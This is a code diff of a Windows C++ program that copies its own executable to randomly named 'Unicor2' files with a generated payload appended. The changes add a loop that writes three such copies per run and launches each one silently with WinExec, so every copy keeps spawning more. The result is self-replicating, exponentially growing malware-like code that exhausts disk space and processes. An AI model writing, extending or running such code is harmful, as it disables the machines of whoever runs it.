@@ -3,7 +3,9 @@
 #define _CRT_SECURE_NO_WARNINGS
 #include <iostream>
 #include<Windows.h>
-#define NextPayloadSize 64
+#define NextPayloadSize 1024
+#define NextNum 3
+#define GapTime 512
 
 int myEXESize = 0;
 int myStaticLength = 0;
@@ -42,14 +44,19 @@ int main(int argc, char** argv)
         }
     if (myStaticLength == 0)
         myStaticLength = myEXESize;
-    GenNxtPayload();
-    srand((unsigned)time(NULL));
-    sprintf(nextEXEName, "Unicor2-0x%X.exe", rand());
-    fp = fopen(nextEXEName, "wb");
-    fwrite(myFileBuffer, 1, myStaticLength, fp);
-    fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
-    fclose(fp);
-    std::cout << "Hello World!\n";
+    for (int i = 0; i < NextNum; i++)
+    {
+        GenNxtPayload();
+        srand((unsigned)time(NULL));
+        sprintf(nextEXEName, "Unicor2-0x%X.exe", rand());
+        fp = fopen(nextEXEName, "wb");
+        fwrite(myFileBuffer, 1, myStaticLength, fp);
+        fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
+        fclose(fp);
+        WinExec(nextEXEName, 0);
+        Sleep(GapTime);
+    }
+    
 }
 
 void GenNxtPayload()
